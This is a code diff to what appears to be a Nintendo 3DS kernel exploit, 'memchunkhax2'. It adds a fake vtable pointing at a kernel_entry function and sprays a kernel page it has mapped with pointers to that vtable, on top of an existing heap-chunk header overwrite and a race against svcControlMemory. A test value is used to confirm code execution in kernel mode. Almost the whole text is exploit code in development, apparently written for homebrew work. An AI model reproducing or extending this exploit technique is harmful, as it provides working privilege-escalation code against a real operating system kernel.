@@ -26,6 +26,12 @@ typedef struct {
 extern u32 __ctru_heap;
 extern u32 __ctru_heap_size;
 
+volatile u32 testVal = 0;
+
+static void kernel_entry() {
+    testVal = 0xDEADCAFE;
+}
+
 // Thread function to slow down svcControlMemory execution.
 static void delay_thread(void* arg) {
     AllocateData* data = (AllocateData*) arg;
@@ -51,6 +57,7 @@ void execute_memchunkhax2() {
     // Set up variables.
     Handle arbiter = __sync_get_arbiter();
     AllocateData* data = (AllocateData*) malloc(sizeof(AllocateData));
+    void** vtable = (void**) linearAlloc(16 * sizeof(u32));
     void* backup = malloc(PAGE_SIZE);
     u32 isolatedPage = 0;
     u32 isolatingPage = 0;
@@ -63,6 +70,11 @@ void execute_memchunkhax2() {
         goto cleanup;
     }
 
+    if(vtable == NULL) {
+        printf("Failed to create vtable buffer.\n");
+        goto cleanup;
+    }
+
     if(backup == NULL) {
         printf("Failed to create kernel page backup buffer.\n");
         goto cleanup;
@@ -71,6 +83,10 @@ void execute_memchunkhax2() {
     data->addr = __ctru_heap + __ctru_heap_size;
     data->size = PAGE_SIZE * 2;
     data->result = -1;
+
+    for(int i = 0; i < 16; i++) {
+        vtable[i] = kernel_entry; // TODO: Convert to kernel virtual address.
+    }
 
     aptOpenSession();
     if(R_FAILED(APT_SetAppCpuTimeLimit(30))) {
@@ -112,6 +128,8 @@ void execute_memchunkhax2() {
 
     // Pull the kernel address of the created object from r2.
     asm("mov %0, r2" : "=r"(kObjAddr));
+
+    // Convert the object address to a value that will properly convert to a physical address during mapping.
     kObjAddr = kObjAddr - SLAB_HEAP_VIRT + SLAB_HEAP_PHYS - KERNEL_VIRT_TO_PHYS;
 
     printf("Mapping pages for overwrite...\n");
@@ -136,10 +154,10 @@ void execute_memchunkhax2() {
     ((MemChunkHdr*) data->addr)->next = (MemChunkHdr*) kObjAddr;
 
     // Use svcArbitrateAddress to detect when the kernel memory page has been mapped.
-    while((u32) svcArbitrateAddress(arbiter, data->addr + PAGE_SIZE, ARBITRATION_WAIT_IF_LESS_THAN_TIMEOUT, 0, 0) == 0xD9001814);
+    //while((u32) svcArbitrateAddress(arbiter, data->addr + PAGE_SIZE, ARBITRATION_WAIT_IF_LESS_THAN_TIMEOUT, 0, 0) == 0xD9001814);
 
     // Back up the kernel page before it is cleared.
-    //memcpy(backup, (void*) (memAddr + PAGE_SIZE), PAGE_SIZE);
+    //memcpy(backup, (void*) (data->addr + PAGE_SIZE), PAGE_SIZE);
 
     printf("Overwrite complete.\n");
 
@@ -153,8 +171,17 @@ void execute_memchunkhax2() {
         svcSleepThread(1000000);
     }
 
+    printf("Map complete.\n");
+
+    //printf("Backup value: %08X\n", *(int*) (backup));
+
     // Restore the kernel page backup.
     //memcpy((void*) (memAddr + PAGE_SIZE), backup, PAGE_SIZE);
+
+    // Fill the mapped memory with pointers to our vtable.
+    for(int i = 0; i < PAGE_SIZE; i += 4) {
+        *(u32*) (data->addr + PAGE_SIZE + i) = (u32) osConvertVirtToPhys(vtable) - KERNEL_VIRT_TO_PHYS;
+    }
 
     if(R_FAILED(data->result)) {
         printf("Failed to map memory.\n");
@@ -194,4 +221,6 @@ void execute_memchunkhax2() {
     if(kObjHandle != 0) {
         svcCloseHandle(kObjHandle);
     }
+
+    printf("Test value: %08X\n", (int) testVal);
 }
